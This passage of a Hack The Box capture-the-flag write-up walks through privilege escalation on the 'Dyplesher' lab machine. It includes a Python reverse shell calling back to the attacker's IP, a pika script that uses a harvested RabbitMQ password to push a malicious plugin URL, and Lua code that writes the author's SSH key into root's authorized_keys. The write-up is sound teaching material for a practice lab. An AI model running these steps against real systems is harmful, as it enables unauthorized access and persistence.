but unfortunately neither had anything useful, and looked like it was all running gameworld information.

```text
felamos@dyplesher:~/yuntao$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
felamos:x:1000:1000:felamos:/home/felamos:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
MinatoTW:x:1001:1001:MinatoTW,,,:/home/MinatoTW:/bin/bash
yuntao:x:1002:1002:,,,:/home/yuntao:/bin/bash
git:x:113:119:Git Version Control,,,:/home/git:/bin/bash
epmd:x:114:120::/var/run/epmd:/usr/sbin/nologin
rabbitmq:x:115:121:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```

{% hint style="info" %}
after checking **`/etc/passwd`** I noticed something a bit strange...is **`git`** usually able to login with a shell?
{% endhint %}

### Enumeration as `yuntao`

Since I hadn't found much useful information as `felamos` besides the hint about cuberite plugins, I decided to try switching to the third user, `yuntao`.

```text
felamos@dyplesher:/home$ su yuntao
Password: 
yuntao@dyplesher:/home$ cd ~
yuntao@dyplesher:~$ ls -la
total 20
drwxr-xr-x 2 yuntao yuntao 4096 Apr 23 15:12 .
drwxr-xr-x 6 root   root   4096 Apr 23 13:58 ..
lrwxrwxrwx 1 root   root      9 Apr 23 15:12 .bash_history -> /dev/null
-rw-r--r-- 1 yuntao yuntao  220 Apr 23 08:11 .bash_logout
-rw-r--r-- 1 yuntao yuntao 3771 Apr 23 08:11 .bashrc
-rw-r--r-- 1 yuntao yuntao  807 Apr 23 08:11 .profile
yuntao@dyplesher:~$ id
uid=1002(yuntao) gid=1002(yuntao) groups=1002(yuntao)
yuntao@dyplesher:~$ sudo -l
[sudo] password for yuntao: 
Sorry, user yuntao may not run sudo on dyplesher.
```

Now I confirmed that I had three users that I could freely `su` between, but I was still missing something.  `yuntao` was also unable to use `sudo`, and I still hadn't found a way to interact with the RabbitMQ service or upload cuberite plugins.  Next I searched for privilege escalation and RabbitMQ led to [https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management](https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management).  I also found a way to interact with RabbitMQ through python at [https://www.rabbitmq.com/tutorials/tutorial-one-python.html](https://www.rabbitmq.com/tutorials/tutorial-one-python.html). 

```python
#!/usr/bin/env python3

import pika

connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))

channel = connection.channel()

channel.queue_declare(queue='hello')

channel.basic_publish(exhange='',
        routing_key='hello',
        body='Hello World!')

print(" [x] 'Hello World!'")

connection.close()
```

I created a test script using the information in the article to see if I could send messages through rabbit... but unfortunately there was no pika module installed on dyplesher. I installed the pika module on my machine and looked up how to connect remotely.

* [https://github.com/pika/pika](https://github.com/pika/pika) [https://pika.readthedocs.io/en/stable/](https://pika.readthedocs.io/en/stable/) 
* [https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika](https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika)
* [https://www.spigotmc.org/threads/rabbitmq-plugin.74032/](https://www.spigotmc.org/threads/rabbitmq-plugin.74032/)

I found a few articles that gave me some good information, including one that specifically dealt with using RabbitMQ to communicate with Minecraft.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ python3 ./rabbit-pika.py
Traceback (most recent call last):
  File "./rabbit-pika.py", line 15, in <module>
    channel.queue_declare(queue='plugin_data')
  File "/home/zweilos/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 2507, in queue_declare
    self._flush_output(declare_ok_result.is_ready)
  File "/home/zweilos/.local/lib/python3.8/site-packages/pika/adapters/blocking_connection.py", line 1340, in _flush_output
    raise self._closing_reason  # pylint: disable=E0702
pika.exceptions.ChannelClosedByBroker: (406, "PRECONDITION_FAILED - inequivalent arg 'durable' for queue 'plugin_data' in vhost '/': received 'false' but current is 'true'")
```

Using the message I had found in the `yuntao` folder in `felamos` home folder I set the `Queue` and `routing_key` to be `plugin_data`, however it setting the `Queue` caused an error.

```python
#!/usr/bin/env python3

import pika

credentials = pika.PlainCredentials('yuntao', 'EashAnicOc3Op')

parameters = pika.ConnectionParameters('10.10.10.190',
        5672,
        '/',
        credentials)
connection = pika.BlockingConnection(parameters)

channel = connection.channel()

#channel.queue_declare(queue='plugin_data')

channel.basic_publish(exchange='',
        routing_key='plugin_data',
        body='http://127.0.0.1:8090/rtme.py')

print(" [x] 'Hello World!'")

connection.close()
```

Next I tried running a python3 http.server on the local machine since the note in the `yuntao` folder had mentioned entering a URL for plugins. After doing some troubleshooting, I found that commenting out the `queue.declare` line allowed me to connect to the service.  I ran my script again and was able to see it connect to my test server on the dyplesher machine. 

```python
#!/usr/bin/env python3

import socket,subprocess,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("10.10.14.216",12523))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

pty.spawn("/bin/bash")
```

I wrote a python reverse shell back to my machine and tried to get my script to execute it.  

```text
MinatoTW@dyplesher:/dev/shm$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
127.0.0.1 - - [12/Oct/2020 14:09:47] "GET /rtme.py HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
```

My script worked, connected to the http server, and retreived my python script, but the python reverse shell didnt work...and neither did writing to `root`'s `authorized_keys` file after modifying the local script. I decided to do some more enumeration of the files in MinatoTW's folder to see if there was anything that I missed that could give me any clues as how to proceed.  

{% hint style="info" %}
Side Note: Python3's **`http.server`** exits much cleaner than the verbose error messages **`SimpleHTTPServer`** from python2 gives!  Sometimes it's the little things that make us happy :\)
{% endhint %}

```text
MinatoTW@dyplesher:~/Cuberite$ ls -la
total 10144
drwxrwxr-x 11 MinatoTW MinatoTW    4096 Apr 23 15:14 .
drwxr-xr-x 10 MinatoTW MinatoTW    4096 Oct 12 14:14 ..
-rw-r--r--  1 MinatoTW MinatoTW     394 Sep  7  2019 BACKERS
-rw-r--r--  1 MinatoTW MinatoTW    3072 Sep  8  2019 banlist.sqlite
-rw-r--r--  1 MinatoTW MinatoTW    4418 Sep  7  2019 brewing.txt
-rw-r--r--  1 MinatoTW MinatoTW     105 Sep  7  2019 buildinfo
-rw-r--r--  1 MinatoTW MinatoTW    1185 Sep  7  2019 CONTRIBUTORS
-rw-r--r--  1 MinatoTW MinatoTW   52636 Sep  7  2019 crafting.txt
-rwxr-xr-x  1 MinatoTW MinatoTW 9942976 Sep  7  2019 Cuberite
-rw-r--r--  1 MinatoTW MinatoTW    2233 Sep  7  2019 favicon.png
-rw-r--r--  1 MinatoTW MinatoTW    8025 Sep  7  2019 furnace.txt
-rw-r--r--  1 MinatoTW MinatoTW  203507 Sep 11  2019 helgrind.log
-rwxr-xr-x  1 MinatoTW MinatoTW     316 Sep  7  2019 hg
-rw-r--r--  1 MinatoTW MinatoTW     581 Sep  7  2019 hg.supp
-rw-rw-r--  1 MinatoTW MinatoTW     872 Sep  8  2019 itemblacklist
-rw-r--r--  1 MinatoTW MinatoTW   26108 Sep  7  2019 items.ini
drwxr-xr-x  2 MinatoTW MinatoTW    4096 Sep  7  2019 lang
-rw-r--r--  1 MinatoTW MinatoTW   11641 Sep  7  2019 LICENSE
drwxr-xr-x  2 MinatoTW MinatoTW    4096 Sep  7  2019 Licenses
drwxrwxr-x  2 MinatoTW MinatoTW    4096 Oct 12 04:39 logs
-rw-r--r--  1 MinatoTW MinatoTW    3072 Apr 23 10:13 MojangAPI.sqlite
-rw-r--r--  1 MinatoTW MinatoTW    2576 Apr 23 17:08 MojangAPI.sqlite-journal
-rw-r--r--  1 MinatoTW MinatoTW    2738 Sep  7  2019 monsters.ini
-rw-rw-r--  1 MinatoTW MinatoTW      40 Sep  8  2019 motd.txt
drwxr-xr-x 11 MinatoTW MinatoTW    4096 Sep 16  2019 Plugins
drwxr-xr-x  4 MinatoTW MinatoTW    4096 Sep  7  2019 Prefabs
-rw-r--r--  1 MinatoTW MinatoTW    8192 Sep  8  2019 Ranks.sqlite
-rw-r--r--  1 MinatoTW MinatoTW     692 Sep  7  2019 README.txt
-rw-rw-r--  1 MinatoTW MinatoTW    1091 Oct 12 04:40 settings.ini
-rwxrwxr-x  1 MinatoTW MinatoTW      24 Sep  9  2019 start.sh
-rwxr-xr-x  1 MinatoTW MinatoTW     375 Sep  7  2019 vg
-rw-r--r--  1 MinatoTW MinatoTW       0 Sep  7  2019 vg.supp
drwxr-xr-x  3 MinatoTW MinatoTW    4096 Sep  8  2019 webadmin
-rw-rw-r--  1 MinatoTW MinatoTW     368 Apr 23 10:12 webadmin.ini
-rw-r--r--  1 MinatoTW MinatoTW    4096 Sep  8  2019 whitelist.sqlite
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_nether
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_the_end
MinatoTW@dyplesher:~/Cuberite$ vim README.txt 
MinatoTW@dyplesher:~/Cuberite$ vim webadmin
MinatoTW@dyplesher:~/Cuberite$ cd webadmin/
MinatoTW@dyplesher:~/Cuberite/webadmin$ ls -la
total 40
drwxr-xr-x  3 MinatoTW MinatoTW 4096 Oct 12 14:24 .
drwxrwxr-x 11 MinatoTW MinatoTW 4096 Oct 12 14:24 ..
drwxr-xr-x  2 MinatoTW MinatoTW 4096 Sep  8  2019 files
-rw-r--r--  1 MinatoTW MinatoTW  665 Sep  7  2019 GenerateSelfSignedHTTPSCertUsingOpenssl.cmd
-rwxr-xr-x  1 MinatoTW MinatoTW  520 Sep  7  2019 GenerateSelfSignedHTTPSCertUsingOpenssl.sh
-rw-rw-r--  1 MinatoTW MinatoTW 1184 Sep  8  2019 httpscert.crt
-rw-------  1 MinatoTW MinatoTW 1704 Sep  8  2019 httpskey.pem
-rw-r--r--  1 MinatoTW MinatoTW 2264 Sep  7  2019 login_template.html
-rw-r--r--  1 MinatoTW MinatoTW 6333 Sep  7  2019 template.lua
MinatoTW@dyplesher:~/Cuberite/webadmin$ vim GenerateSelfSignedHTTPSCertUsingOpenssl.sh 
MinatoTW@dyplesher:~/Cuberite/webadmin$ vim template.lua 
MinatoTW@dyplesher:~/Cuberite/webadmin$ ls files/
favicon.png  header.png  login.css  logo_login.png  pmfolder.gif  sub_pmfolder.gif  thead.png
guest.html   home.gif    login.gif  log_out.png     style.css     tcat.png
MinatoTW@dyplesher:~/Cuberite/webadmin$ ls -la files
total 64
drwxr-xr-x 2 MinatoTW MinatoTW 4096 Sep  8  2019 .
drwxr-xr-x 3 MinatoTW MinatoTW 4096 Oct 12 14:30 ..
-rw-r--r-- 1 MinatoTW MinatoTW  553 Sep  7  2019 favicon.png
-rw-r--r-- 1 MinatoTW MinatoTW  220 Sep  8  2019 guest.html
-rw-r--r-- 1 MinatoTW MinatoTW  221 Sep  7  2019 header.png
-rw-r--r-- 1 MinatoTW MinatoTW 1026 Sep  7  2019 home.gif
-rw-r--r-- 1 MinatoTW MinatoTW 3906 Sep  7  2019 login.css
-rw-r--r-- 1 MinatoTW MinatoTW  586 Sep  7  2019 login.gif
-rw-r--r-- 1 MinatoTW MinatoTW 2550 Sep  7  2019 logo_login.png
-rw-r--r-- 1 MinatoTW MinatoTW  995 Sep  7  2019 log_out.png
-rw-r--r-- 1 MinatoTW MinatoTW  995 Sep  7  2019 pmfolder.gif
-rw-r--r-- 1 MinatoTW MinatoTW 7630 Sep  7  2019 style.css
-rw-r--r-- 1 MinatoTW MinatoTW 1022 Sep  7  2019 sub_pmfolder.gif
-rw-r--r-- 1 MinatoTW MinatoTW  183 Sep  7  2019 tcat.png
-rw-r--r-- 1 MinatoTW MinatoTW  132 Sep  7  2019 thead.png
```

I went back and looked closer into the Minecraft related files in `MinatoTW`'s user folder.  In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server. 

![](../../.gitbook/assets/20-cuberite-webadmin.png)

The `template.lua` file included code for loading plugins and running code for the webadmin site.  I did some research on lua and cRoot, which led me to pages related to Cuberite, which made me sure I was on the right track.  

[https://api.cuberite.org/cRoot.html](https://api.cuberite.org/cRoot.html)

> cRoot class
>
> This class represents the root of Cuberite's object hierarchy. There is always only one cRoot object. It manages and allows querying all the other objects, such as cServer, cPluginManager, individual worlds etc.

If this server will execute Lua scripts as code then perhaps I could use one to either send me a shell or write an SSH key...unfortunately I had never written anything in Lua, so I had some more reading to do.  I found a good resource which showed me that writing to a file was just as easy as in python.  

[https://www.tutorialspoint.com/lua/lua\_file\_io.htm](https://www.tutorialspoint.com/lua/lua_file_io.htm)

```lua
file = io.open("/home/MinatoTW/.ssh/authorized_keys", "a+")

file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")

file.close()
```

I tested my Lua script by using it to append my SSH key \(again\) to `MinatoTW`'s `authorized_keys` file, and was successful!

### Getting a shell

Next I tried running the script against root through my remote RabbitMQ connection.

```lua
file = io.open("/root/.ssh/authorized_keys", "w")

file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")

file.close()
```

My first try was unsuccessful, but after some troubleshooting, I realized that for some reason the file was not being opened for appending. Changing the file open mode to `write` made everything work~

### Root.txt

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ ssh -i minato.key root@dyplesher.htb                                                          130 ⨯
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 12 Oct 2020 03:06:31 PM UTC

  System load:  0.02              Processes:              246
  Usage of /:   6.8% of 97.93GB   Users logged in:        1
  Memory usage: 40%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun May 24 03:33:34 2020
root@dyplesher:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
dyplesher
root@dyplesher:~# cat root.txt 
a0a4e509a610c426f8eb668a977774f0
```

After writing my public key to `root` it was simple to login using SSH and collect my hard-earned proof!

![](../../.gitbook/assets/21-pwned-.png)

Thanks to [`felamos`](https://www.hackthebox.eu/home/users/profile/27390) & [yuntao](https://www.hackthebox.eu/home/users/profile/12438) for creating this very challenging, yet very fun and interesting machine! I learned a lot more about Minecraft plugins than I ever thought I would want to!

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

